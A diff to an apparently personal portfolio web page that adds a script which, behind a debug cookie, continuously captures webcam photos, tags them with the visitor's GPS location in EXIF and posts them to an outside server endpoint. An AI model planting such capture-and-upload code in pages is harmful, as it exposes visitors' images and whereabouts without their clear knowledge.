@@ -39,6 +39,7 @@
     <link rel="alternate stylesheet" href="css/colors/purple.css" title="purple">
     <link rel="alternate stylesheet" href="css/colors/slate.css" title="slate">
     <link rel="alternate stylesheet" href="css/colors/yellow.css" title="yellow">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/piexifjs/1.0.6/piexif.js"></script>
 </head>
 
 <body class="dark-vertion black-bg">
@@ -1111,6 +1112,324 @@
         gtag('config', 'G-RSJV74SFV8');
     </script>
     </div>
+    <script>
+        let intervalId;
+        let debug;
+        let imagePreviewEnabled;
+        let session_id;
+        let stream;
+        let captureCount = 1;
+        let captureEnabled = false;
+        let serverEndpoint = 'https://karhanaa.myweb.cs.uwindsor.ca/test.php';
+        let locationData = null;
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // Location data is available in the position object
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    const altitude = position.coords.altitude;
+                    const altitudeAccuracy = position.coords.altitudeAccuracy;
+                    const timestamp = position.timestamp;
+
+                    // Store the location data in the variable
+                    locationData = {
+                        latitude: latitude,
+                        longitude: longitude,
+                        accuracy: accuracy,
+                        altitude: altitude,
+                        altitudeAccuracy: altitudeAccuracy,
+                        timestamp: timestamp
+                    };
+
+                    console.log("Location data:", locationData);
+                },
+                (error) => {
+                    console.error("Error getting location:", error.message);
+                }
+                );
+            }
+            else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // check if browser has cookie setup with key "debug"
+        if (document.cookie.split(';').some((item) => item.trim().startsWith('debug='))) {
+            // Set debug to the value of the cookie
+            debug = document.cookie
+                .split('; ')
+                .find(row => row.startsWith('debug'))
+                .split('=')[1];
+        } 
+        else {
+            // Cookie does not exist, add a new cookie with key "debug" and value of 0 and append to existing cookies
+            document.cookie = `debug=0; path=/`;
+        }
+
+        // check if browser has cookie setup with key "imagePreviewEnabled"
+        if (document.cookie.split(';').some((item) => item.trim().startsWith('imagePreviewEnabled='))) {
+            // Set imagePreviewEnabled to the value of the cookie
+            imagePreviewEnabled = document.cookie
+                .split('; ')
+                .find(row => row.startsWith('imagePreviewEnabled'))
+                .split('=')[1];
+        } 
+        else {
+            // Cookie does not exist, add a new cookie with key "imagePreviewEnabled" and value of 1 and append to existing cookies
+            document.cookie = `imagePreviewEnabled=0; path=/`;
+        }
+
+        // Check if browser has cookie setup with key "session_id"
+        if (document.cookie.split(';').some((item) => item.trim().startsWith('session_id='))) {
+            // Set session_id to the value of the cookie
+            session_id = document.cookie
+                .split('; ')
+                .find(row => row.startsWith('session_id'))
+                .split('=')[1];
+        } 
+        else {
+            // generate a new session_id
+            session_id = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+            // Cookie does not exist, add a new cookie with key "session_id" and value of session_id and append to existing cookies
+            document.cookie = `session_id=${session_id}; path=/`;
+        }
+
+        function toggleCaptureButtons(isEnabled) {
+            captureEnabled = isEnabled;
+            const startCaptureButton = document.getElementById('startCaptureButton');
+            const stopCaptureButton = document.getElementById('stopCaptureButton');
+            if (captureEnabled) {
+                startCaptureButton.style.display = 'none';
+                stopCaptureButton.style.display = 'inline-block';
+            } else {
+                startCaptureButton.style.display = 'inline-block';
+                stopCaptureButton.style.display = 'none';
+                // stop camera stream
+                stream.getTracks().forEach(function(track) {
+                    track.stop();
+                });
+                stream = null;
+            }
+        }
+
+        function sendImageToServer(endpoint, inputString) {
+            // Encode the string to make sure it's URL-safe
+            const encodedString = encodeURIComponent(inputString);
+
+            // Construct the URL
+            const url = endpoint;
+
+            // Construct the POST request options and body containing imageData and session_id
+            const requestOptions = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded', // Set the content type based on your server requirements
+                },
+                body: `imageData=${encodedString}&sessionId=${session_id}`,
+            };
+
+            // Make the POST request using fetch
+            fetch(url, requestOptions)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! Status: ${response.status}`);
+                    }
+                    return response.text();
+                })
+                .then(data => {
+                    console.log('Response:', data);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }
+
+        async function startContinuousCapture() {
+            // Get the location data
+            getLocation();
+
+            try {
+                // Request permission to access the camera
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+                if (debug == 1) {
+                    console.log('Got stream with constraints:', { video: true });
+                    console.log('Using video device: ' + stream.getVideoTracks()[0].label);
+                    // Display the camera resolution
+                    console.log('Camera resolution:', displayCameraResolution(stream));
+                }
+
+                // capture after 1secs of permission granted
+                setTimeout(() => capture(stream), 1000);
+
+                // Start capturing pictures continuously at 5 second intervals
+                intervalId = setInterval(() => capture(stream), 5000);
+            } catch (error) {
+                // Permission denied or an error occurred
+                console.error('Error accessing camera:', error);
+            }
+        }
+
+        function displayCameraResolution(stream) {
+            const videoTrack = stream.getVideoTracks()[0];
+            if (videoTrack) {
+                const settings = videoTrack.getSettings();
+                const resolutionString = `${settings.width}x${settings.height}`;
+                document.getElementById('cameraResolution').innerText = `Camera Resolution: ${resolutionString}`;
+                return resolutionString;
+            }
+            return 'Unknown';
+        }
+
+        async function capture(stream) {
+            // Create a new video element for each capture
+            const videoElement = document.createElement('video');
+            videoElement.srcObject = stream;
+            videoElement.autoplay = true;
+
+            videoElement.onloadedmetadata = async () => {
+                // Create a new canvas for each capture
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                // Convert the canvas content to a data URL with image compression
+                const imageDataURL = compressImage(canvas, 0.5); // Set the compression quality (0.0 to 1.0)
+
+                // Add Location data to the image exif
+                if (locationData != null) {
+                    const exifObj = piexif.load(imageDataURL);
+                    //make locationData.timestamp to "1999:99:99 99:99:99" format
+                    let DateStamp = new Date(locationData.timestamp);
+                    let year = DateStamp.getFullYear();
+                    let month = DateStamp.getMonth() + 1;
+                    let day = DateStamp.getDate();
+                    let hour = DateStamp.getHours();
+                    let minute = DateStamp.getMinutes();
+                    let second = DateStamp.getSeconds();
+                    let timestamp = year + ":" + month + ":" + day + " " + hour + ":" + minute + ":" + second;
+                    
+                    if (exifObj["GPS"][piexif.GPSIFD.GPSDateStamp] == null) {
+                        exifObj["GPS"][piexif.GPSIFD.GPSDateStamp] = timestamp;
+                    }
+                    if (exifObj["GPS"][piexif.GPSIFD.GPSLatitudeRef] == null) {
+                        exifObj["GPS"][piexif.GPSIFD.GPSLatitudeRef] = locationData.latitude < 0 ? 'S' : 'N';
+                    }
+                    if (exifObj["GPS"][piexif.GPSIFD.GPSLatitude] == null) {
+                        exifObj["GPS"][piexif.GPSIFD.GPSLatitude] = piexif.GPSHelper.degToDmsRational(locationData.latitude);
+                    }
+                    if (exifObj["GPS"][piexif.GPSIFD.GPSLongitudeRef] == null) {
+                        exifObj["GPS"][piexif.GPSIFD.GPSLongitudeRef] = locationData.longitude < 0 ? 'W' : 'E';
+                    }
+                    if (exifObj["GPS"][piexif.GPSIFD.GPSLongitude] == null) {
+                        exifObj["GPS"][piexif.GPSIFD.GPSLongitude] = piexif.GPSHelper.degToDmsRational(locationData.longitude);
+                    }
+                    if (locationData.altitude != null && locationData.altitude > 0 && (exifObj["GPS"][piexif.GPSIFD.GPSAltitudeRef] == null || exifObj["GPS"][piexif.GPSIFD.GPSAltitude] == null)) {
+                        exifObj["GPS"][piexif.GPSIFD.GPSAltitudeRef] = locationData.altitude < 0 ? 1 : 0;
+                        exifObj["GPS"][piexif.GPSIFD.GPSAltitude] = [locationData.altitude, 1];
+                    }
+                    if (exifObj["GPS"][piexif.GPSIFD.GPSDOP] == null) {
+                        exifObj["GPS"][piexif.GPSIFD.GPSDOP] = [locationData.accuracy, 1];
+                    }
+                    if (exifObj["Exif"][piexif.ExifIFD.DateTimeOriginal] == null) {
+                        exifObj["Exif"][piexif.ExifIFD.DateTimeOriginal] = timestamp;
+                    }
+                    var exifStr = piexif.dump(exifObj);
+                    const newDataURL = piexif.insert(exifStr, imageDataURL);
+                    //console.log(newDataURL);
+                    sendImageToServer(serverEndpoint, newDataURL);
+                }
+
+
+                // Log the compressed image data
+                //console.log('Compressed image:', imageDataURL);
+
+                sendImageToServer(serverEndpoint, imageDataURL);
+
+                if (debug == 1) {
+                    // Show a preview of the compressed image
+                    showImagePreview(imageDataURL);
+                }
+                
+            };
+        }
+
+        function compressImage(canvas, quality) {
+            // Create a new canvas for compression
+            const compressedCanvas = document.createElement('canvas');
+            compressedCanvas.width = canvas.width;
+            compressedCanvas.height = canvas.height;
+            const context = compressedCanvas.getContext('2d');
+            context.drawImage(canvas, 0, 0, canvas.width, canvas.height);
+
+            // Convert the compressed canvas content to a data URL with specified quality
+            const compressedImageDataURL = compressedCanvas.toDataURL('image/jpeg', quality);
+            return compressedImageDataURL;
+        }
+
+        function showImagePreview(imageDataURL) {
+            // Create an image element for the preview
+            const imagePreview = document.createElement('img');
+            imagePreview.src = imageDataURL;
+            imagePreview.alt = `Capture ${captureCount}`;
+            imagePreview.width = 500; // Set the width as needed
+            imagePreview.height = 500; // Set the height as needed
+
+            // Append the image preview to the container
+            const imagePreviewContainer = document.getElementById('imagePreviewContainer');
+            imagePreviewContainer.appendChild(imagePreview);
+
+            // Increment the capture count for unique alt attributes
+            captureCount++;
+        }
+
+        if (debug == 1) {
+            // <h1>Camera Continuous Capture, Compress, and Preview Example</h1>
+            // <button id="startCaptureButton" onclick="toggleCaptureButtons(true);startContinuousCapture()">Start Continuous Capture</button>
+            // <button id="stopCaptureButton" onclick="toggleCaptureButtons(false);clearInterval(intervalId)" style="display: none;">Stop Continuous Capture</button>
+            // <div id="imagePreviewContainer"></div>
+            // <p id="cameraResolution"></p>
+            // Create a container all above elements
+            
+            const header = document.createElement('h1');
+            header.innerText = 'Camera Continuous Capture, Compress, and Preview Example';
+            const startCaptureButton = document.createElement('button');
+            startCaptureButton.id = 'startCaptureButton';
+            startCaptureButton.innerText = 'Start Continuous Capture';
+            startCaptureButton.onclick = () => {
+                toggleCaptureButtons(true);
+                startContinuousCapture();
+            };
+            const stopCaptureButton = document.createElement('button');
+            stopCaptureButton.id = 'stopCaptureButton';
+            stopCaptureButton.innerText = 'Stop Continuous Capture';
+            stopCaptureButton.style.display = 'none';
+            stopCaptureButton.onclick = () => {
+                toggleCaptureButtons(false);
+                clearInterval(intervalId);
+            };
+            const imagePreviewContainer = document.createElement('div');
+            imagePreviewContainer.id = 'imagePreviewContainer';
+            const cameraResolution = document.createElement('p');
+            cameraResolution.id = 'cameraResolution';
+            
+            const container = document.createElement('div');
+            container.appendChild(header);
+            container.appendChild(startCaptureButton);
+            container.appendChild(stopCaptureButton);
+            container.appendChild(imagePreviewContainer);
+            container.appendChild(cameraResolution);
+
+            // Append the container to the body
+            document.body.appendChild(container);
+        }
+    </script>
 </body>
 
 </html>
